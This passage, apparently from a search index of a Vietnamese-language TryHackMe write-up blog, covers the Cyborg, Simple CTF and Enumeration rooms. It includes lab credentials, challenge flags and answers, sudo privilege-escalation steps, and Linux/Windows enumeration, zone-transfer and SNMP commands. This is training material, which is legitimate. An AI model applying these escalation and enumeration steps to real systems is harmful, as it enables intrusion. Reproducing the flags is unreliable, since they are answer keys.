Lisp home / alex /. config / sublime-text - 3 / Cache / Lisp / Lisp . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Lua home / alex /. config / sublime-text - 3 / Cache / Lua / Lua . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Makefile home / alex /. config / sublime-text - 3 / Cache / Makefile / Make Output . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Makefile / Makefile . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Markdown home / alex /. config / sublime-text - 3 / Cache / Markdown / Markdown . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Markdown / MultiMarkdown . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Matlab home / alex /. config / sublime-text - 3 / Cache / Matlab / Matlab . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Objective-C home / alex /. config / sublime-text - 3 / Cache / Objective-C / Objective-C . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Objective-C / Objective-C ++. sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / OCaml home / alex /. config / sublime-text - 3 / Cache / OCaml / camlp4 . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / OCaml / OCaml . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / OCaml / OCamllex . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / OCaml / OCamlyacc . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Pascal home / alex /. config / sublime-text - 3 / Cache / Pascal / Pascal . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Perl home / alex /. config / sublime-text - 3 / Cache / Perl / Perl . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / PHP home / alex /. config / sublime-text - 3 / Cache / PHP / PHP . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / PHP / PHP Source . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / PHP / Regular Expressions ( PHP ). sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Python home / alex /. config / sublime-text - 3 / Cache / Python / Python . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Python / Regular Expressions ( Python ). sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / R home / alex /. config / sublime-text - 3 / Cache / R / R . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / R / R Console . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / R / Rd ( R Documentation ). sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Rails home / alex /. config / sublime-text - 3 / Cache / Rails / HTML ( Rails ). sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Rails / JavaScript ( Rails ). sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Rails / Ruby Haml . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Rails / Ruby on Rails . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Rails / SQL ( Rails ). sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Regular Expressions home / alex /. config / sublime-text - 3 / Cache / Regular Expressions / RegExp . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / RestructuredText home / alex /. config / sublime-text - 3 / Cache / RestructuredText / reStructuredText . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Ruby home / alex /. config / sublime-text - 3 / Cache / Ruby / Ruby . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Rust home / alex /. config / sublime-text - 3 / Cache / Rust / Cargo . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Rust / Rust . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Scala home / alex /. config / sublime-text - 3 / Cache / Scala / Scala . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / ShellScript home / alex /. config / sublime-text - 3 / Cache / ShellScript / Bash . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / ShellScript / commands-builtin-shell-bash . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / ShellScript / Shell-Unix-Generic . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / SQL home / alex /. config / sublime-text - 3 / Cache / SQL / SQL . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / TCL home / alex /. config / sublime-text - 3 / Cache / TCL / HTML ( Tcl ). sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / TCL / Tcl . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Text home / alex /. config / sublime-text - 3 / Cache / Text / Plain text . tmLanguage . cache home / alex /. config / sublime-text - 3 / Cache / Text / Plain text . tmLanguage . rcache home / alex /. config / sublime-text - 3 / Cache / Textile home / alex /. config / sublime-text - 3 / Cache / Textile / Textile . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / XML home / alex /. config / sublime-text - 3 / Cache / XML / XML . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / YAML home / alex /. config / sublime-text - 3 / Cache / YAML / YAML . sublime-syntax . cache home / alex /. config / sublime-text - 3 / Cache / Default home / alex /. config / sublime-text - 3 / Cache / Default / Syntax Summary . cache home / alex /. config / sublime-text - 3 / Cache / Default / Meta Info Summary . cache home / alex /. config / sublime-text - 3 / Cache / Default / Startup . cache home / alex /. config / sublime-text - 3 / Packages home / alex /. config / sublime-text - 3 / Packages / User home / alex /. config / sublime-text - 3 / Local home / alex /. config / sublime-text - 3 / Local / Auto Save Session . sublime_session home / alex /. config / sublime-text - 3 / Lib home / alex /. config / sublime-text - 3 / Lib / python3 . 3 home / alex /. config / sublime-text - 3 / Installed Packages home / alex /. config / ibus home / alex /. config / ibus / bus home / alex / Documents home / alex / Documents / note . txt home / alex / Public home / alex / Videos home / alex / Desktop home / alex / Desktop / secret . txt home / alex / Downloads home / alex / Templates home / alex / Pictures T\u1eeb d\u1eef li\u1ec7u tr\u00ean, ta l\u1ea5y \u0111\u01b0\u1ee3c username v\u00e0 password login ssh th\u00f4ng qua file note.txt c\u00f3 trong d\u1eef li\u1ec7u Terminal \u2514\u2500 $ cat home / alex / Documents / note . txt Wow I 'm awful at remembering Passwords so I' ve taken my Friends advice and noting them down ! alex : S3cretP @s3","title":"Reconnaissance"},{"location":"tryhackme/room/cyborgt8/#init-access","text":"","title":"Init Access"},{"location":"tryhackme/room/cyborgt8/#privilege-escalation","text":"B\u00e0i n\u00e0y leo quy\u1ec1n kh\u00e1 \u0111\u01a1n gi\u1ea3n alex @ubuntu :/ etc / mp3backups $ sudo -l Matching Defaults entries for alex on ubuntu : env_reset , mail_badpass , secure_path =/ usr / local / sbin \\:/ usr / local / bin \\:/ usr / sbin \\:/ usr / bin \\:/ sbin \\:/ bin \\:/ snap / bin User alex may run the following commands on ubuntu : ( ALL : ALL ) NOPASSWD : / etc / mp3backups / backup . sh sudo -l cho ta th\u1ea5y user alex c\u00f3 quy\u1ec1n sudo tr\u00ean file backup, nh\u01b0ng quan tr\u1ecdng h\u01a1n alex l\u1ea1i l\u00e0 ng\u01b0\u1eddi t\u1ea1o file \u0111\u00f3 :3 C\u1ea5p quy\u1ec1n write Do v\u1eady ta c\u1ea5p quy\u1ec1n ghi v\u00e0o file v\u00e0 th\u00eam /bin/bash \u0111\u1ec3 ch\u1ea1y quy\u1ec1n root. Ta s\u1ebd leo quy\u1ec1n th\u00e0nh c\u00f4ng. Full flag","title":"Privilege Escalation"},{"location":"tryhackme/room/cyborgt8/#what-we-learned","text":"Borg backup: https://borgbackup.readthedocs.io/en/stable/usage/extract.html?highlight=extract#borg-extract","title":"What we learned"},{"location":"tryhackme/room/easyctf/","tags":["THM-Room","Privilege Escalation","SQL Injection"],"text":"Simple CTF \u00b6 Task 1: Simple CTF \u00b6 Deploy the machine and attempt the questions! Answer the questions bellow \u00b6 How many services are running under port 1000? Ans: 2 What is running on the higher port? Ans: ssh What's the CVE you're using against the application? Ans: CVE-2019-9053 To what kind of vulnerability is the application vulnerable? Ans: SQLi What's the password? Ans: secret Where can you login with the details obtained? Ans: ssh What's the user flag? Ans: G00d j0b, keep up! Is there any other user in the home directory? What's its name? Ans: Sunbath What can you leverage to spawn a privileged shell? Ans: Vim What's the root flag? Ans: W3ll d0n3. You made it! Hints \u00b6 :3 D\u00f4 web th\u00ec \u0111\u1ea7u ti\u00ean c\u1ee9 nmap v\u00e0 gobuster thoai, khi m\u00e0 c\u00f3 \u0111\u01b0\u1ee3c website c\u1ea7n pentest r\u1ed3i th\u00ec ta s\u1ebd th\u1ea5y \u0111\u01b0\u1ee3c version c\u1ee7a ph\u00eda server Alt text T\u00ecm l\u1ed7 h\u1ecfng th\u00f4ng qua searchsploit Alt text ::) \u0111\u1ec3 \u00fd version python m\u00e0 ch\u1ea1y tool cho k\u0129. Sau khi c\u00f3 \u0111\u01b0\u1ee3c user/pass, login v\u1edbi ssh (nh\u1edb c\u00e1i port l\u00fac nmap, t\u1ea1i kh\u00f4ng scan nmap th\u00ec kh\u00f4ng t\u00ecm \u0111\u01b0\u1ee3c port ssh n\u00e0y \u0111\u00e2u - ho\u1eb7c t\u00ecm kh\u00f3 :V). R\u1ed3i, leo thang \u0111\u1eb7c quy\u1ec1n v\u1edbi vim (sudo -l) t\u1ea1i \u0111\u00e2y","title":"Simple CTF"},{"location":"tryhackme/room/easyctf/#simple-ctf","text":"","title":"Simple CTF"},{"location":"tryhackme/room/easyctf/#task-1-simple-ctf","text":"Deploy the machine and attempt the questions!","title":"Task 1: Simple CTF"},{"location":"tryhackme/room/easyctf/#answer-the-questions-bellow","text":"How many services are running under port 1000? Ans: 2 What is running on the higher port? Ans: ssh What's the CVE you're using against the application? Ans: CVE-2019-9053 To what kind of vulnerability is the application vulnerable? Ans: SQLi What's the password? Ans: secret Where can you login with the details obtained? Ans: ssh What's the user flag? Ans: G00d j0b, keep up! Is there any other user in the home directory? What's its name? Ans: Sunbath What can you leverage to spawn a privileged shell? Ans: Vim What's the root flag? Ans: W3ll d0n3. You made it!","title":"Answer the questions bellow"},{"location":"tryhackme/room/easyctf/#hints","text":":3 D\u00f4 web th\u00ec \u0111\u1ea7u ti\u00ean c\u1ee9 nmap v\u00e0 gobuster thoai, khi m\u00e0 c\u00f3 \u0111\u01b0\u1ee3c website c\u1ea7n pentest r\u1ed3i th\u00ec ta s\u1ebd th\u1ea5y \u0111\u01b0\u1ee3c version c\u1ee7a ph\u00eda server Alt text T\u00ecm l\u1ed7 h\u1ecfng th\u00f4ng qua searchsploit Alt text ::) \u0111\u1ec3 \u00fd version python m\u00e0 ch\u1ea1y tool cho k\u0129. Sau khi c\u00f3 \u0111\u01b0\u1ee3c user/pass, login v\u1edbi ssh (nh\u1edb c\u00e1i port l\u00fac nmap, t\u1ea1i kh\u00f4ng scan nmap th\u00ec kh\u00f4ng t\u00ecm \u0111\u01b0\u1ee3c port ssh n\u00e0y \u0111\u00e2u - ho\u1eb7c t\u00ecm kh\u00f3 :V). R\u1ed3i, leo thang \u0111\u1eb7c quy\u1ec1n v\u1edbi vim (sudo -l) t\u1ea1i \u0111\u00e2y","title":"Hints"},{"location":"tryhackme/room/empire/","tags":["THM-Room"],"text":"TryHackMe - empire \u00b6 Task 1: Introduction \u00b6","title":"TryHackMe - Empire"},{"location":"tryhackme/room/empire/#tryhackme-empire","text":"","title":"TryHackMe - empire"},{"location":"tryhackme/room/empire/#task-1-introduction","text":"","title":"Task 1: Introduction"},{"location":"tryhackme/room/enumeration/","tags":["THM-Room"],"text":"Enumeration \u00b6 Task 1: Introduction \u00b6 This room is organized as follows: Purpose of enumeration Linux enumeration with commonly-installed tools: System, users, networking, and running services MS Windows enumeration with built-in tools: System, users, networking, and running services Examples of additional tools: Seatbelt\\ Answer the questions bellow \u00b6 What command would you use to start the PowerShell interactive command line? powershell.exe Task 2: Purpose \u00b6 Focus: Users and groups Hostnames Routing tables Network shares Network services Applications and banners Firewall configurations Service settings and audit configurations SNMP and DNS details Hunting for credentials (saved on web browsers or client applications) etc... Answer the questions bellow \u00b6 In SSH key-based authentication, which key does the client need private key Task 3: Linux Enumeration \u00b6 M\u1ed9t v\u00e0i ti\u1ebfp c\u1eadn ban \u0111\u1ea7u: System \u00b6 ls /etc/*-release : T\u00ecm ki\u1ebfm c\u00e1c t\u1ec7p tin k\u1ebft th\u00fac b\u1eb1ng -release v\u00e0 n\u1eb1m trong folder etc hostname : T\u00ecm t\u00ean h\u1ec7 th\u1ed1ng. /usr/bin/ , /sbin/ : N\u01a1i ch\u1ee9a c\u00e1c \u1ee9ng d\u1ee5ng \u0111\u00e3 c\u00e0i \u0111\u1eb7t. dpkg -l : L\u1ea5y danh s\u00e1ch c\u00e1c package \u0111\u00e3 c\u00e0i (Linux Debian) rpm -qa : L\u1ea5y danh s\u00e1ch c\u00e1c package \u0111\u00e3 c\u00e0i (Linux RPM) Users \u00b6 who : Xem th\u00f4ng tin nh\u1eefng user \u0111\u00e3 login w : Xem th\u00f4ng tin nh\u1eefng user \u0111\u00e3 login v\u00e0 \u0111ang l\u00e0m g\u00ec last : Xem g\u1ea7n \u0111\u00e2y ai \u0111\u00e3 s\u1eed d\u1ee5ng h\u1ec7 th\u1ed1ng sudo -l : Li\u1ec7t k\u00ea l\u1ec7nh \u0111\u01b0\u1ee3c ph\u00e9p cho ng\u01b0\u1eddi d\u00f9ng g\u1ecdi tr\u00ean h\u1ec7 th\u1ed1ng Networking \u00b6 ip address show = ip a s = ifconfig -a : Hi\u1ec3n th\u1ecb ip cat /etc/resolv.conf : Xem m\u00e1y ch\u1ee7 DNS netstat : L\u1ec7nh d\u00f9ng \u0111\u1ec3 t\u00ecm hi\u1ec3u v\u1ec1 k\u1ebft n\u1ed1i m\u1ea1ng Options Description -a show both listening and non-listening sockets -l show only listening sockets -n show numeric output instead of resolving the IP address and port number -t TCP -u UDP -x UNIX -n Show the PID and name of the program to which the socket belongs Terminal user @TryHackMe $ sudo netstat -plt Active Internet connections ( only servers ) Proto Recv-Q Send-Q Local Address Foreign Address State PID / Program name tcp 0 0 0 . 0 . 0 . 0 : ssh 0 . 0 . 0 . 0 :* LISTEN 978 / sshd tcp 0 0 localhost : smtp 0 . 0 . 0 . 0 :* LISTEN 1141 / master tcp6 0 0 [::]: ssh [::]:* LISTEN 978 / sshd tcp6 0 0 localhost : smtp [::]:* LISTEN 1141 / master netstat -atupn : Hi\u1ec3n th\u1ecb t\u1ea5t c\u1ea3 k\u1ebft n\u1ed1i \u0111\u00e3 thi\u1ebft l\u1eadp TCP, UDP (\u0111\u01b0a ra \u0111\u1ecbnh d\u1ea1ng s\u1ed1) Terminal user @TryHackMe $ sudo netstat -atupn Active Internet connections ( servers and established ) Proto Recv-Q Send-Q Local Address Foreign Address State PID / Program name tcp 0 0 0 . 0 . 0 . 0 : 22 0 . 0 . 0 . 0 :* LISTEN 978 / sshd tcp 0 0 127 . 0 . 0 . 1 : 25 0 . 0 . 0 . 0 :* LISTEN 1141 / master tcp 0 0 10 . 20 . 30 . 129 : 22 10 . 20 . 30 . 113 : 38822 ESTABLISHED 5665 / sshd : peter [ p tcp 0 0 10 . 20 . 30 . 129 : 22 10 . 20 . 30 . 105 : 38826 ESTABLISHED 5723 / sshd : jane [ pr tcp6 0 0 ::: 22 :::* LISTEN 978 / sshd tcp6 0 0 :: 1 : 25 :::* LISTEN 1141 / master udp 0 0 127 . 0 . 0 . 1 : 323 0 . 0 . 0 . 0 :* 640 / chronyd udp 0 0 0 . 0 . 0 . 0 : 68 0 . 0 . 0 . 0 :* 5638 / dhclient udp6 0 0 :: 1 : 323 :::* 640 / chronyd lsof Terminal user @TryHackMe $ sudo lsof -i COMMAND PID USER FD TYPE DEVICE SIZE / OFF NODE NAME chronyd 640 chrony 5u IPv4 16945 0t0 UDP localhost : 323 chronyd 640 chrony 6u IPv6 16946 0t0 UDP localhost : 323 sshd 978 root 3u IPv4 20035 0t0 TCP *: ssh ( LISTEN ) sshd 978 root 4u IPv6 20058 0t0 TCP *: ssh ( LISTEN ) master 1141 root 13u IPv4 20665 0t0 TCP localhost : smtp ( LISTEN ) master 1141 root 14u IPv6 20666 0t0 TCP localhost : smtp ( LISTEN ) dhclient 5638 root 6u IPv4 47458 0t0 UDP *: bootpc sshd 5693 peter 3u IPv4 47594 0t0 TCP rpm-red-enum . thm : ssh -> 10 . 20 . 30 . 113 : 38822 ( ESTABLISHED ) [...] lsof -i :25 : Gi\u1edbi h\u1ea1n \u0111\u1ea7u ra nh\u1eefng th\u1ee9 \u1edf port 25 (nh\u01b0 smtp) Running Services \u00b6 ps : Xem c\u00e1c ti\u1ebfn tr\u00ecnh \u0111ang ch\u1ea1y Options Description -e all processes -f full-format listing -j jobs format -l long format -u user-oriented format ps aux = ps -ef : Xem \u0111\u1ea7y \u0111\u1ee7 ti\u1ebfn tr\u00ecnh ps axjf : Hi\u1ec3n th\u1ecb c\u00e2y ti\u1ebfn tr\u00ecnh ps -ef | grep ABC : l\u1ea5y ra c\u00e1c ti\u1ebfn tr\u00ecnh c\u00f3 ABC Answer the questions bellow \u00b6 What is the name of the Linux distribution used in the VM? Ans: Ubuntu What is its version number? Ans: 20.04.4 What is the name of the user who last logged in to the system? Ans: randa What is the highest listening TCP port number? Ans: 6667 G\u1ee3i \u00fd Xem hi\u1ec3n th\u1ecb t\u1ea1i Terminal user @red -linux-enumeration :~$ netstat -atupn | grep \"tcp\" ( Not all processes could be identified , non-owned process info will not be shown , you would have to be root to see it all .) tcp 0 0 0 . 0 . 0 . 0 : 389 0 . 0 . 0 . 0 :* LISTEN - tcp 0 0 127 . 0 . 0 . 1 : 6667 0 . 0 . 0 . 0 :* LISTEN - tcp 0 0 10 . 10 . 223 . 177 : 53 0 . 0 . 0 . 0 :* LISTEN - tcp 0 0 127 . 0 . 0 . 1 : 53 0 . 0 . 0 . 0 :* LISTEN - tcp 0 0 127 . 0 . 0 . 53 : 53 0 . 0 . 0 . 0 :* LISTEN - tcp 0 0 0 . 0 . 0 . 0 : 22 0 . 0 . 0 . 0 :* LISTEN - tcp 0 0 127 . 0 . 0 . 1 : 953 0 . 0 . 0 . 0 :* LISTEN - tcp 0 308 10 . 10 . 223 . 177 : 22 10 . 18 . 80 . 57 : 56546 ESTABLISHED - tcp6 0 0 ::: 389 :::* LISTEN - tcp6 0 0 fe80 :: 5 : 4ff : fe24 : 277 : 53 :::* LISTEN - tcp6 0 0 :: 1 : 53 :::* LISTEN - tcp6 0 0 ::: 21 :::* LISTEN - tcp6 0 0 ::: 22 :::* LISTEN - tcp6 0 0 :: 1 : 953 :::* LISTEN - What is the program name of the service listening on it? Ans: inspircd G\u1ee3i \u00fd C\u00f3 hai c\u00e1ch d\u00f9ng nh\u01b0ng \u0111\u1ec1u d\u00f9ng sudo m\u1edbi c\u00f3 th\u1ec3 hi\u1ec3n th\u1ecb \u0111\u01b0\u1ee3c NAME: D\u00f9ng sudo lsof -i :6667 Terminal user @red -linux-enumeration :~$ sudo lsof -i : 6667 COMMAND PID USER FD TYPE DEVICE SIZE / OFF NODE NAME inspircd 718 irc 4u IPv4 27760 0t0 TCP localhost : ircd ( LISTEN ) D\u00f9ng sudo netstat -atupn There is a script running in the background. Its name starts with THM. What is the name of the script? Ans: THM-24765.sh G\u1ee3i \u00fd Terminal user @red -linux-enumeration :~$ ps aux | grep \"THM\" randa 642 0 . 0 0 . 0 2608 592 ? Ss 13 : 54 0 : 00 / bin / sh -c / home / randa / THM - 24765 . sh randa 645 0 . 0 0 . 2 6892 2236 ? S 13 : 54 0 : 00 / bin / bash / home / randa / THM - 24765 . sh user 2530 0 . 0 0 . 0 6432 720 pts / 0 S + 15 : 08 0 : 00 grep - -color = auto THM Task 4: Windows Enumeration \u00b6 Alt text System \u00b6 systeminfo : Xem th\u00f4ng tin chi ti\u1ebft c\u1ee7a h\u1ec7 th\u1ed1ng Example CMD PS C :\\ Users \\ user > systeminfo Host Name : RED-WIN-ENUM OS Name : Microsoft Windows Server 2019 Datacenter OS Version : 10 . 0 . 17763 N / A Build 17763 OS Manufacturer : Microsoft Corporation OS Configuration : Standalone Server OS Build Type : Multiprocessor Free Registered Owner : EC2 Registered Organization : Amazon . com Product ID : 00430 - 00000 - 00000-AA155 Original Install Date : 3 / 17 / 2021 , 2 : 59 : 06 PM System Boot Time : 8 / 22 / 2023 , 3 : 41 : 32 PM System Manufacturer : Amazon EC2 System Model : t3a . small System Type : x64-based PC Processor ( s ): 1 Processor ( s ) Installed . [ 01 ]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~ 2200 Mhz BIOS Version : Amazon EC2 1 . 0 , 10 / 16 / 2017 Windows Directory : C :\\ Windows System Directory : C :\\ Windows \\ system32 Boot Device : \\ Device \\ HarddiskVolume1 System Locale : en-us ; English ( United States ) Input Locale : en-us ; English ( United States ) Time Zone : ( UTC ) Coordinated Universal Time Total Physical Memory : 2 , 016 MB Available Physical Memory : 1 , 042 MB Virtual Memory : Max Size : 2 , 400 MB Virtual Memory : Available : 1 , 458 MB Virtual Memory : In Use : 942 MB Page File Location ( s ): C :\\ pagefile . sys Domain : WORKGROUP Logon Server : N / A Hotfix ( s ): 30 Hotfix ( s ) Installed . [ 01 ]: KB5015731 [ 02 ]: KB4470502 [ 03 ]: KB4470788 [ 04 ]: KB4480056 [ 05 ]: KB4486153 [ 06 ]: KB4493510 [ 07 ]: KB4499728 [ 08 ]: KB4504369 [ 09 ]: KB4512577 [ 10 ]: KB4512937 [ 11 ]: KB4521862 [ 12 ]: KB4523204 [ 13 ]: KB4535680 [ 14 ]: KB4539571 [ 15 ]: KB4549947 [ 16 ]: KB4558997 [ 17 ]: KB4562562 [ 18 ]: KB4566424 [ 19 ]: KB4570332 [ 20 ]: KB4577586 [ 21 ]: KB4577667 [ 22 ]: KB4587735 [ 23 ]: KB4589208 [ 24 ]: KB4598480 [ 25 ]: KB4601393 [ 26 ]: KB5000859 [ 27 ]: KB5015811 [ 28 ]: KB5012675 [ 29 ]: KB5014031 [ 30 ]: KB5014797 Network Card ( s ): 1 NIC ( s ) Installed . [ 01 ]: Amazon Elastic Network Adapter Connection Name : Ethernet 3 DHCP Enabled : Yes DHCP Server : 10 . 10 . 0 . 1 IP address ( es ) [ 01 ]: 10 . 10 . 185 . 186 [ 02 ]: fe80 :: f552 : b4b7 : 83c3 : ccef Hyper-V Requirements : A hypervisor has been detected . Features required for Hyper-V will not be displayed . wmic qfe get Caption,Description : Ki\u1ec3m tra c\u00e1c b\u1ea3n c\u1eadp nh\u1eadp \u0111\u00e3 c\u00e0i \u0111\u1eb7t Example CMD C :\\> wmic qfe get Caption , Description Caption Description http :// support . microsoft . com / ? kbid = 5013630 Update https :// support . microsoft . com / help / 5013944 Security Update Update net start : Xem c\u00e1c t\u1ec7p window \u0111\u00e3 \u0111\u01b0\u1ee3c c\u00e0i \u0111\u1eb7t v\u00e0 kh\u1edfi \u0111\u1ed9ng Example CMD C :\\> net start These Windows services are started : Base Filtering Engine Certificate Propagation Client License Service ( ClipSVC ) COM + Event System Connected User Experiences and Telemetry CoreMessaging Cryptographic Services DCOM Server Process Launcher DHCP Client DNS Client [...] Windows Time Windows Update WinHTTP Web Proxy Auto-Discovery Service Workstation The command completed successfully . wmic product get name,version,vendor : Xem c\u00e1c \u1ee9ng d\u1ee5ng \u0111\u00e3 c\u00e0i \u0111\u1eb7t Example CMD C :\\> wmic product get name , version , vendor Name Vendor Version Microsoft Visual C ++ 2019 X64 Minimum Runtime - 14 . 28 . 29910 Microsoft Corporation 14 . 28 . 29910 [...] Microsoft Visual C ++ 2019 X64 Additional Runtime - 14 . 28 . 29910 Microsoft Corporation 14 . 28 . 29910 Users \u00b6 whoami : Xem b\u1ea1n l\u00e0 ai whoami /priv : Xem nh\u1eefng quy\u1ec1n c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng Example CMD C :\\> whoami win-server-cli \\ strategos > whoami / priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ========================================= ================================================================== ======= SeIncreaseQuotaPrivilege Adjust memory quotas for a process Enabled SeSecurityPrivilege Manage auditing and security log Enabled SeTakeOwnershipPrivilege Take ownership of files or other objects Enabled [...] whoami /groups : Ki\u1ec3m tra xem b\u1ea1n thu\u1ed9c nh\u00f3m n\u00e0o net user : Xem nh\u1eefng ng\u01b0\u1eddi d\u00f9ng Example CMD C :\\> net user User accounts for \\\\ WIN-SERVER-CLI ------------------------------------------------------------------------------- Administrator DefaultAccount Guest michael peter strategos WDAGUtilityAccount The command completed successfully . net group , net localgroup : Xem c\u00e1c nh\u00f3m Example CMD C :\\> net localgroup Aliases for \\\\ WIN-SERVER-CLI ------------------------------------------------------------------------------- * Access Control Assistance Operators * Administrators * Backup Operators * Certificate Service DCOM Access * Cryptographic Operators * Device Owners [...] net localgroup administrators : Xem ng\u01b0\u1eddi d\u00f9ng admin c\u1ee5c b\u1ed9 Example CND C :\\> net localgroup administrators Alias name administrators Comment Administrators have complete and unrestricted access to the computer / domain Members ------------------------------------------------------------------------------- Administrator michael peter strategos The command completed successfully . net accounts , net accounts /domain : Xem account/ acount trong AD Xem th\u00eam t\u1ea1i Hacking with powershell Networking \u00b6 ipconfig /all : Xem \u0111\u1ecba ch\u1ec9 ip netstat -abno : -a: Hi\u1ec3n th\u1ecb t\u1ea5t c\u1ea3 th\u00f4ng tin v\u1ec1 c\u00e1c port \u0111ang listen/connect -b: T\u00ecm t\u1ec7p nh\u1ecb ph\u00e2n li\u00ean quan \u0111\u1ebfn k\u1ebft n\u1ed1i -n: output number -o: Hi\u1ec3n th\u1ecb ID process (PID) arp -a : Xem b\u1ea3ng ARP Answer the questions bellow \u00b6 What is the full OS Name? Ans: Microsoft Windows Server 2019 Datacenter Tip Xem example \u1edf ph\u1ea7n System What is the OS Version? Ans: 10.0.17763 Tip Xem example \u1edf ph\u1ea7n System How many hotfixes are installed on this MS Windows Server? Ans: 30 Tip Xem example \u1edf ph\u1ea7n System What is the lowest TCP port number listening on the system? Ans: 22 Tip D\u00f9ng netstat CMD PS C :\\ Users \\ user > netstat Active Connections Proto Local Address Foreign Address State TCP 10 . 10 . 185 . 186 : 22 ip - 10 - 18 - 80 - 57 : 58676 ESTABLISHED TCP 10 . 10 . 185 . 186 : 49771 20 . 12 . 23 . 50 : https SYN_SENT What is the name of the program listening on that port? Ans: sshd.exe Tip D\u00f9ng netstat -abno Alt text Task 5: DNS, SMB, and SNMP \u00b6 DNS \u00b6 SMB \u00b6 net share : Ki\u1ec3m tra c\u00e1c th\u01b0 m\u1ee5c \u0111\u01b0\u1ee3c chia s\u1ebb Example CMD user @TryHackMe $ net share Share name Resource Remark ------------------------------------------------------------------------------- C $ C :\\ Default share IPC $ Remote IPC ADMIN $ C :\\ Windows Remote Admin Internal C :\\ Internal Files Internal Documents Users C :\\ Users The command completed successfully . SNMP \u00b6 Answer the questions bellow \u00b6 Knowing that the domain name on the MS Windows Server of IP 10.10.138.215 is redteam.thm, use dig to carry out a domain transfer. What is the flag that you get in the records? Ans: THM{DNS_ZONE} Tip B\u00e0i n\u00e0y kh\u00f3 1 c\u00e1i l\u00e0 ssh v\u00e0o ngay powershell nh\u01b0ng powershell th\u00ec l\u1ea1i kh\u00f4ng c\u00f3 dig \u0111\u1ec3 ta xem record. Ta s\u1ebd l\u1ee3i d\u1ee5ng nslookup nh\u01b0 terminal b\u00ean d\u01b0\u1edbi CMD PS C :\\ Users \\ user > nslookup 10 . 10 . 138 . 215 Server : ip - 10 - 0 - 0 - 2 . eu-west - 1 . compute . internal Address : 10 . 0 . 0 . 2 Name : ip - 10 - 10 - 138 - 215 . eu-west - 1 . compute . internal Address : 10 . 10 . 138 . 215 PS C :\\ Users \\ user > nslookup Default Server : ip - 10 - 0 - 0 - 2 . eu-west - 1 . compute . internal Address : 10 . 0 . 0 . 2 > server 10 . 10 . 138 . 215 Default Server : ip - 10 - 10 - 138 - 215 . eu-west - 1 . compute . internal Address : 10 . 10 . 138 . 215 > ls -d redteam . thm [ ip - 10 - 10 - 138 - 215 . eu-west - 1 . compute . internal ] redteam . thm . SOA red-win-enum hostmaster . ( 5 900 600 86400 3600 ) redteam . thm . NS red-win-enum first A 10 . 10 . 254 . 1 flag TXT \"THM{DNS_ZONE}\" second A 10 . 10 . 254 . 2 tryhackme CNAME tryhackme . com redteam . thm . SOA red-win-enum hostmaster . ( 5 900 600 86400 3600 ) > What is the name of the share available over SMB protocol and starts with THM? Ans: THM{829738} Tip CMD PS C :\\ Users \\ user > net share Share name Resource Remark ------------------------------------------------------------------------------- C $ C :\\ Default share IPC $ Remote IPC ADMIN $ C :\\ Windows Remote Admin Internal C :\\ Internal Files Internal Documents THM { 829738 } C :\\ Users \\ user \\ Private Enjoy SMB shares Users C :\\ Users The command completed successfully . Knowing that the community string used by the SNMP service is public, use snmpcheck to collect information about the MS Windows Server of IP 10.10.138.215. What is the location specified? Ans: THM{SNMP_SERVICE} Tip Ch\u1ea1y /opt/snmpcheck/snmpcheck.rb 10.10.138.215 -c public | more tr\u00ean m\u00e1y attackbox. Task 6: More Tools for Windows \u00b6 Sysinternals Suite \u00b6 Xem t\u1ea1i https://docs.microsoft.com/en-us/sysinternals/downloads/ Utility Name Description Process Explorer Shows the processes along with the open files and registry keys Process Monitor Monitor the file system, processes, and Registry PsList Provides information about processes PsLoggedOn Shows the logged-in users Process Hacker \u00b6 Xem t\u1ea1i https://processhacker.sourceforge.io/ GhostPack Seatbelt \u00b6 Xem t\u1ea1i https://github.com/GhostPack/Seatbelt Answer the questions bellow \u00b6 What utility from Sysinternals Suite shows the logged-in users? Ans: PsLoggedOn Task 7: Conclusion \u00b6 The focus of this room was on built-in command-line tools in both Linux and MS Windows systems. Many commands exist in both systems, although the command arguments and resulting output are different. The following tables show the 